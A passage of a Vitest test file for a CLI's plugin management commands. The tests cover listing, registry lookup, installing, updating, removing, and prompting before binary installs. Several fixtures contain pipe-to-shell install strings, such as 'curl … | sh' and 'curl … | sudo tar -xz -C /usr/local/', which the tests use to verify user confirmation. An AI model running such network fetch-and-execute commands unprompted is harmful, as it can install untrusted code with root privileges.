import { Command } from 'commander';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import type { CataloguedPlugin } from 'types/plugin.types';
import type { RegistryEntry } from 'plugins/plugin-registry.service';

vi.mock('plugins/plugin-loader.service', () => ({
	PluginLoaderService: vi.fn().mockImplementation(() => ({
		catalogAll: vi.fn(() => [])
	}))
}));

vi.mock('node:readline', () => ({
	createInterface: vi.fn()
}));

vi.mock('plugins/plugin-installer.service', async (importOriginal) => {
	const actual = await importOriginal<typeof import('plugins/plugin-installer.service')>();
	return {
		...actual,
		peekTarballManifest: vi.fn(),
		PluginInstallerService: vi.fn().mockImplementation(() => ({
			install: vi.fn(),
			installFromTarball: vi.fn(),
			uninstall: vi.fn()
		}))
	};
});

vi.mock('plugins/plugin-registry.service', () => ({
	fetchPluginRegistry: vi.fn()
}));

vi.mock('updater/registry', () => ({
	fetchLatestVersionFor: vi.fn().mockResolvedValue(null)
}));

vi.mock('config/loader', () => ({
	getConfigLoader: vi.fn(() => ({
		get: vi.fn(() => ({ plugins: { enabled: [] } }))
	}))
}));

vi.mock('output/color-adapter.interface', () => ({
	getColorAdapter: vi.fn(() => ({
		bold: (s: string) => s,
		cyan: (s: string) => s,
		dim: (s: string) => s,
		green: (s: string) => s,
		red: (s: string) => s,
		yellow: (s: string) => s
	}))
}));

import * as readline from 'node:readline';
import { PluginInstallerService, peekTarballManifest } from 'plugins/plugin-installer.service';
import { PluginLoaderService } from 'plugins/plugin-loader.service';
import { fetchPluginRegistry } from 'plugins/plugin-registry.service';
import { fetchLatestVersionFor } from 'updater/registry';

import { configurePluginCommand, defaultPromptInstall } from './plugin.command';

type MockedCatalogAll = ReturnType<typeof vi.fn>;

function makeCatalogAll(plugins: CataloguedPlugin[]): MockedCatalogAll {
	return vi.fn(() => plugins);
}

function makePlugin(partial: Partial<CataloguedPlugin>): CataloguedPlugin {
	return {
		dir: '/some/dir/valora-plugin-rtk',
		location: 'user',
		manifest: { name: 'valora-plugin-rtk', version: '1.0.0' },
		status: 'enabled',
		...partial
	};
}

function makeProgram(hooks?: Parameters<typeof configurePluginCommand>[1]): Command {
	const program = new Command();
	program.exitOverride();
	configurePluginCommand(program as never, hooks);
	return program;
}

async function runCommand(program: Command, args: string[]): Promise<void> {
	await program.parseAsync(['node', 'valora', ...args]);
}

describe('plugin list', () => {
	let consoleSpy: ReturnType<typeof vi.spyOn>;
	let exitSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
		exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
	});

	afterEach(() => {
		consoleSpy.mockRestore();
		exitSpy.mockRestore();
		vi.clearAllMocks();
	});

	it('prints enabled plugins with a checkmark', async () => {
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([makePlugin({ status: 'enabled' })])
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'list']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('✓');
		expect(output).toContain('valora-plugin-rtk');
	});

	it('prints disabled plugins with a circle marker', async () => {
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([makePlugin({ status: 'disabled' })])
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'list']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('○');
	});

	it('prints invalid plugins with a cross marker', async () => {
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([makePlugin({ manifest: null, status: 'invalid' })])
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'list']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('✗');
	});

	it('prints a summary header with counts', async () => {
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([makePlugin({ status: 'enabled' }), makePlugin({ status: 'disabled' })])
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'list']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('1 enabled');
		expect(output).toContain('1 disabled');
	});

	it('shows a message when no plugins are discovered', async () => {
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([])
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'list']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('none');
	});
});

describe('plugin available', () => {
	let consoleSpy: ReturnType<typeof vi.spyOn>;
	let consoleErrorSpy: ReturnType<typeof vi.spyOn>;
	let exitSpy: ReturnType<typeof vi.spyOn>;

	const sampleRegistry: RegistryEntry[] = [
		{
			contributes: ['agents', 'commands'],
			description: 'Engineering commands.',
			name: 'valora-plugin-engineering',
			package: '@windagency/valora-plugin-engineering',
			version: '1.0.0'
		},
		{
			contributes: ['hooks', 'code'],
			description: 'RTK integration.',
			name: 'valora-plugin-rtk',
			package: '@windagency/valora-plugin-rtk',
			version: '1.0.0'
		}
	];

	beforeEach(() => {
		consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
		consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => undefined);
		exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
	});

	afterEach(() => {
		consoleSpy.mockRestore();
		consoleErrorSpy.mockRestore();
		exitSpy.mockRestore();
		vi.clearAllMocks();
	});

	it('lists all plugins from the registry', async () => {
		vi.mocked(fetchPluginRegistry).mockResolvedValue(sampleRegistry);
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([])
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'available']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('valora-plugin-engineering');
		expect(output).toContain('valora-plugin-rtk');
	});

	it('marks installed plugins with a checkmark', async () => {
		vi.mocked(fetchPluginRegistry).mockResolvedValue(sampleRegistry);
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([makePlugin({ dir: '/some/dir/valora-plugin-rtk', status: 'enabled' })])
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'available']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toMatch(/✓.*valora-plugin-rtk/);
	});

	it('marks not-installed plugins with a circle marker', async () => {
		vi.mocked(fetchPluginRegistry).mockResolvedValue(sampleRegistry);
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([])
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'available']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toMatch(/○.*valora-plugin-engineering/);
	});

	it('prints an install hint footer', async () => {
		vi.mocked(fetchPluginRegistry).mockResolvedValue(sampleRegistry);
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([])
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'available']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('valora plugin add');
	});

	it('shows an error and exits when the registry fetch fails', async () => {
		vi.mocked(fetchPluginRegistry).mockResolvedValue(null);

		const program = makeProgram();
		await runCommand(program, ['plugin', 'available']);

		expect(consoleErrorSpy).toHaveBeenCalledWith(expect.stringContaining('registry'));
		expect(exitSpy).toHaveBeenCalledWith(1);
	});
});

describe('plugin add', () => {
	let consoleSpy: ReturnType<typeof vi.spyOn>;
	let consoleErrorSpy: ReturnType<typeof vi.spyOn>;
	let exitSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
		consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => undefined);
		exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
	});

	afterEach(() => {
		consoleSpy.mockRestore();
		consoleErrorSpy.mockRestore();
		exitSpy.mockRestore();
		vi.clearAllMocks();
	});

	it('calls install and prints a success message', async () => {
		const mockInstall = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: mockInstall
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'add', 'rtk']);

		expect(mockInstall).toHaveBeenCalledWith('rtk', 'user', undefined);
		expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('installed'));
	});

	it('prints an error and exits when install throws', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockRejectedValue(new Error('npm 404'))
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'add', 'rtk']);

		expect(consoleErrorSpy).toHaveBeenCalledWith(expect.stringContaining('npm 404'));
		expect(exitSpy).toHaveBeenCalledWith(1);
	});

	it('rejects an invalid scope', async () => {
		const program = makeProgram();
		await runCommand(program, ['plugin', 'add', 'rtk', '--scope', 'invalid']);

		expect(consoleErrorSpy).toHaveBeenCalledWith(expect.stringContaining('Invalid scope'));
		expect(exitSpy).toHaveBeenCalledWith(1);
	});
});

describe('plugin update --check', () => {
	let consoleSpy: ReturnType<typeof vi.spyOn>;
	let consoleErrorSpy: ReturnType<typeof vi.spyOn>;
	let exitSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
		consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => undefined);
		exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
	});

	afterEach(() => {
		consoleSpy.mockRestore();
		consoleErrorSpy.mockRestore();
		exitSpy.mockRestore();
		vi.clearAllMocks();
	});

	it('lists outdated plugins without installing when --check is passed', async () => {
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({ manifest: { name: 'valora-plugin-rtk', version: '1.0.0' }, location: 'user', status: 'enabled' })
			])
		}));
		vi.mocked(fetchPluginRegistry).mockResolvedValue([
			{
				name: 'valora-plugin-rtk',
				package: '@windagency/valora-plugin-rtk',
				version: '1.1.0',
				contributes: [],
				description: ''
			}
		]);

		const program = makeProgram();
		await runCommand(program, ['plugin', 'update', '--check']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('valora-plugin-rtk');
		expect(output).toContain('1.0.0');
		expect(output).toContain('1.1.0');
		const mockInstall = (PluginInstallerService as ReturnType<typeof vi.fn>).mock.results[0]?.value?.install;
		if (mockInstall) expect(mockInstall).not.toHaveBeenCalled();
	});

	it('prints a message when all plugins are up to date', async () => {
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({ manifest: { name: 'valora-plugin-rtk', version: '1.1.0' }, status: 'enabled' })
			])
		}));
		vi.mocked(fetchPluginRegistry).mockResolvedValue([
			{
				name: 'valora-plugin-rtk',
				package: '@windagency/valora-plugin-rtk',
				version: '1.1.0',
				contributes: [],
				description: ''
			}
		]);

		const program = makeProgram();
		await runCommand(program, ['plugin', 'update', '--check']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('up to date');
	});
});

describe('plugin update (install)', () => {
	let consoleSpy: ReturnType<typeof vi.spyOn>;
	let consoleErrorSpy: ReturnType<typeof vi.spyOn>;
	let exitSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
		consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => undefined);
		exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
	});

	afterEach(() => {
		consoleSpy.mockRestore();
		consoleErrorSpy.mockRestore();
		exitSpy.mockRestore();
		vi.clearAllMocks();
	});

	it('installs all outdated non-npm plugins when no name is specified', async () => {
		const mockInstall = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementation(() => ({
			install: mockInstall,
			uninstall: vi.fn()
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({ manifest: { name: 'valora-plugin-rtk', version: '1.0.0' }, location: 'user', status: 'enabled' }),
				makePlugin({
					dir: '/plugins/valora-plugin-eng',
					manifest: { name: 'valora-plugin-eng', version: '2.0.0' },
					location: 'project',
					status: 'enabled'
				})
			])
		}));
		vi.mocked(fetchPluginRegistry).mockResolvedValue([
			{
				name: 'valora-plugin-rtk',
				package: '@windagency/valora-plugin-rtk',
				version: '1.1.0',
				contributes: [],
				description: ''
			},
			{
				name: 'valora-plugin-eng',
				package: '@windagency/valora-plugin-eng',
				version: '2.1.0',
				contributes: [],
				description: ''
			}
		]);

		const program = makeProgram();
		await runCommand(program, ['plugin', 'update']);

		expect(mockInstall).toHaveBeenCalledTimes(2);
		expect(mockInstall).toHaveBeenCalledWith('valora-plugin-rtk', 'user', undefined);
		expect(mockInstall).toHaveBeenCalledWith('valora-plugin-eng', 'project', undefined);
	});

	it('installs only the named plugin when a name is provided', async () => {
		const mockInstall = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementation(() => ({
			install: mockInstall,
			uninstall: vi.fn()
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({ manifest: { name: 'valora-plugin-rtk', version: '1.0.0' }, location: 'user', status: 'enabled' }),
				makePlugin({
					dir: '/plugins/valora-plugin-eng',
					manifest: { name: 'valora-plugin-eng', version: '2.0.0' },
					location: 'user',
					status: 'enabled'
				})
			])
		}));
		vi.mocked(fetchPluginRegistry).mockResolvedValue([
			{
				name: 'valora-plugin-rtk',
				package: '@windagency/valora-plugin-rtk',
				version: '1.1.0',
				contributes: [],
				description: ''
			},
			{
				name: 'valora-plugin-eng',
				package: '@windagency/valora-plugin-eng',
				version: '2.1.0',
				contributes: [],
				description: ''
			}
		]);

		const program = makeProgram();
		await runCommand(program, ['plugin', 'update', 'rtk']);

		expect(mockInstall).toHaveBeenCalledTimes(1);
		expect(mockInstall).toHaveBeenCalledWith('valora-plugin-rtk', 'user', undefined);
	});

	it('matches a plugin when the name uses the valora- package prefix', async () => {
		const mockInstall = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementation(() => ({
			install: mockInstall,
			uninstall: vi.fn()
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({ manifest: { name: 'valora-plugin-rtk', version: '1.0.0' }, location: 'user', status: 'enabled' }),
				makePlugin({
					dir: '/plugins/valora-plugin-product',
					manifest: { name: 'valora-plugin-product', version: '2.0.0' },
					location: 'user',
					status: 'enabled'
				})
			])
		}));
		vi.mocked(fetchPluginRegistry).mockResolvedValue([
			{
				name: 'valora-plugin-rtk',
				package: '@windagency/valora-plugin-rtk',
				version: '1.1.0',
				contributes: [],
				description: ''
			},
			{
				name: 'valora-plugin-product',
				package: '@windagency/valora-plugin-product',
				version: '2.1.0',
				contributes: [],
				description: ''
			}
		]);

		const program = makeProgram();
		await runCommand(program, ['plugin', 'update', 'valora-plugin-product']);

		expect(mockInstall).toHaveBeenCalledTimes(1);
		expect(mockInstall).toHaveBeenCalledWith('valora-plugin-product', 'user', undefined);
	});

	it('warns and skips npm-scope plugins without installing', async () => {
		const mockInstall = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementation(() => ({
			install: mockInstall,
			uninstall: vi.fn()
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({ manifest: { name: 'valora-plugin-rtk', version: '1.0.0' }, location: 'npm', status: 'enabled' })
			])
		}));
		vi.mocked(fetchPluginRegistry).mockResolvedValue([
			{
				name: 'valora-plugin-rtk',
				package: '@windagency/valora-plugin-rtk',
				version: '1.1.0',
				contributes: [],
				description: ''
			}
		]);

		const program = makeProgram();
		await runCommand(program, ['plugin', 'update']);

		expect(mockInstall).not.toHaveBeenCalled();
		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('package manager');
	});

	it('prints a message when no plugins need updating', async () => {
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({ manifest: { name: 'valora-plugin-rtk', version: '1.1.0' }, location: 'user', status: 'enabled' })
			])
		}));
		vi.mocked(fetchPluginRegistry).mockResolvedValue([
			{
				name: 'valora-plugin-rtk',
				package: '@windagency/valora-plugin-rtk',
				version: '1.1.0',
				contributes: [],
				description: ''
			}
		]);

		const program = makeProgram();
		await runCommand(program, ['plugin', 'update']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('up to date');
	});

	it('falls back to npm for plugins absent from the registry catalog', async () => {
		const mockInstall = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementation(() => ({
			install: mockInstall,
			uninstall: vi.fn()
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: { name: 'valora-plugin-custom', version: '1.0.0' },
					location: 'user',
					status: 'enabled'
				})
			])
		}));
		vi.mocked(fetchPluginRegistry).mockResolvedValue([]);
		vi.mocked(fetchLatestVersionFor).mockResolvedValue('2.0.0');

		const program = makeProgram();
		await runCommand(program, ['plugin', 'update', '--check']);

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('valora-plugin-custom');
		expect(output).toContain('2.0.0');
	});
});

describe('plugin remove', () => {
	let consoleSpy: ReturnType<typeof vi.spyOn>;
	let consoleErrorSpy: ReturnType<typeof vi.spyOn>;
	let exitSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
		consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => undefined);
		exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
	});

	afterEach(() => {
		consoleSpy.mockRestore();
		consoleErrorSpy.mockRestore();
		exitSpy.mockRestore();
		vi.clearAllMocks();
	});

	it('calls uninstall and prints a success message', async () => {
		const mockUninstall = vi.fn();
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			uninstall: mockUninstall
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'remove', 'rtk']);

		expect(mockUninstall).toHaveBeenCalledWith('rtk', 'user');
		expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('removed'));
	});

	it('prints an error and exits when the plugin is not installed', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			uninstall: vi.fn().mockImplementation(() => {
				throw new Error('Plugin "valora-plugin-rtk" is not installed in the user scope');
			})
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'remove', 'rtk']);

		expect(consoleErrorSpy).toHaveBeenCalledWith(expect.stringContaining('not installed'));
		expect(exitSpy).toHaveBeenCalledWith(1);
	});

	it('rejects an invalid scope', async () => {
		const program = makeProgram();
		await runCommand(program, ['plugin', 'remove', 'rtk', '--scope', 'invalid']);

		expect(consoleErrorSpy).toHaveBeenCalledWith(expect.stringContaining('Invalid scope'));
		expect(exitSpy).toHaveBeenCalledWith(1);
	});
});

describe('plugin add — binary requirement warnings', () => {
	let consoleSpy: ReturnType<typeof vi.spyOn>;
	let consoleWarnSpy: ReturnType<typeof vi.spyOn>;
	let exitSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
		consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
		exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
	});

	afterEach(() => {
		consoleSpy.mockRestore();
		consoleWarnSpy.mockRestore();
		exitSpy.mockRestore();
		vi.clearAllMocks();
	});

	it('warns with install URL when a required binary is not on PATH after npm install', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					dir: '/plugins/valora-plugin-ollama',
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [{ install: 'https://ollama.com', name: 'ollama' }],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));

		const program = makeProgram({ binaryChecker: vi.fn().mockResolvedValue(false) });
		await runCommand(program, ['plugin', 'add', 'ollama']);

		const warnOutput = consoleWarnSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(warnOutput).toContain('ollama');
		expect(warnOutput).toContain('https://ollama.com');
	});

	it('does not warn when all required binaries are present', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [{ name: 'node' }],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));

		const program = makeProgram({ binaryChecker: vi.fn().mockResolvedValue(true) });
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(consoleWarnSpy).not.toHaveBeenCalled();
	});

	it('warns after tgz install when required binary is absent', async () => {
		vi.mocked(peekTarballManifest).mockReturnValue({ name: 'valora-plugin-ollama', version: '1.0.0' });
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([])
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [{ install: 'https://ollama.com', name: 'ollama' }],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn(),
			installFromTarball: vi.fn().mockResolvedValue(undefined)
		}));

		const program = makeProgram({ binaryChecker: vi.fn().mockResolvedValue(false) });
		await runCommand(program, ['plugin', 'add', '/path/to/plugin.tgz']);

		const warnOutput = consoleWarnSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(warnOutput).toContain('ollama');
		expect(warnOutput).toContain('https://ollama.com');
	});

	it('runs the installCommand and reports success when user confirms', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [{ installCommand: 'curl -fsSL https://ollama.com/install.sh | sh', name: 'ollama' }],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockBinaryInstaller = vi.fn().mockResolvedValue(0);

		const program = makeProgram({
			binaryChecker: vi.fn().mockResolvedValue(false),
			binaryInstaller: mockBinaryInstaller,
			promptInstall: vi.fn().mockResolvedValue(true)
		});
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(mockBinaryInstaller).toHaveBeenCalledWith('curl -fsSL https://ollama.com/install.sh | sh');
		const logOutput = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(logOutput).toContain('ollama');
	});

	it('shows URL warning when user declines the install prompt', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [
							{
								install: 'https://ollama.com',
								installCommand: 'curl -fsSL https://ollama.com/install.sh | sh',
								name: 'ollama'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockBinaryInstaller = vi.fn();

		const program = makeProgram({
			binaryChecker: vi.fn().mockResolvedValue(false),
			binaryInstaller: mockBinaryInstaller,
			promptInstall: vi.fn().mockResolvedValue(false)
		});
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(mockBinaryInstaller).not.toHaveBeenCalled();
		const warnOutput = consoleWarnSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(warnOutput).toContain('https://ollama.com');
	});
});

describe('plugin add — autoInstall binary requirement', () => {
	let consoleSpy: ReturnType<typeof vi.spyOn>;
	let consoleWarnSpy: ReturnType<typeof vi.spyOn>;
	let exitSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
		consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
		exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
	});

	afterEach(() => {
		consoleSpy.mockRestore();
		consoleWarnSpy.mockRestore();
		exitSpy.mockRestore();
		vi.clearAllMocks();
	});

	it('always prompts before running the install command, even when autoInstall is true', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [
							{
								autoInstall: true,
								installCommand: 'curl -fsSL https://example.com/ollama.tgz | sudo tar -xz -C /usr/local/',
								name: 'ollama'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockPromptInstall = vi.fn().mockResolvedValue(true);
		const mockBinaryInstaller = vi.fn().mockResolvedValue(0);

		const program = makeProgram({
			binaryChecker: vi.fn().mockResolvedValue(false),
			binaryInstaller: mockBinaryInstaller,
			promptInstall: mockPromptInstall
		});
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(mockPromptInstall).toHaveBeenCalledWith(
			'ollama',
			'curl -fsSL https://example.com/ollama.tgz | sudo tar -xz -C /usr/local/'
		);
		expect(mockBinaryInstaller).toHaveBeenCalledWith(
			'curl -fsSL https://example.com/ollama.tgz | sudo tar -xz -C /usr/local/'
		);
	});

	it('does not run the install command when the user declines, even with autoInstall: true', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [
							{
								autoInstall: true,
								installCommand: 'curl -fsSL https://example.com/ollama.tgz | sudo tar -xz -C /usr/local/',
								name: 'ollama'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockPromptInstall = vi.fn().mockResolvedValue(false);
		const mockBinaryInstaller = vi.fn().mockResolvedValue(0);

		const program = makeProgram({
			binaryChecker: vi.fn().mockResolvedValue(false),
			binaryInstaller: mockBinaryInstaller,
			promptInstall: mockPromptInstall
		});
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(mockPromptInstall).toHaveBeenCalled();
		expect(mockBinaryInstaller).not.toHaveBeenCalled();
	});

	it('still prompts when autoInstall is not set', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [
							{
								installCommand: 'curl -fsSL https://example.com/ollama.tgz | sudo tar -xz -C /usr/local/',
								name: 'ollama'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockPromptInstall = vi.fn().mockResolvedValue(false);

		const program = makeProgram({
			binaryChecker: vi.fn().mockResolvedValue(false),
			promptInstall: mockPromptInstall
		});
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(mockPromptInstall).toHaveBeenCalled();
	});
});

describe('plugin add — postInstallCommand', () => {
	let consoleSpy: ReturnType<typeof vi.spyOn>;
	let consoleWarnSpy: ReturnType<typeof vi.spyOn>;
	let exitSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
		consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
		exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
	});

	afterEach(() => {
		consoleSpy.mockRestore();
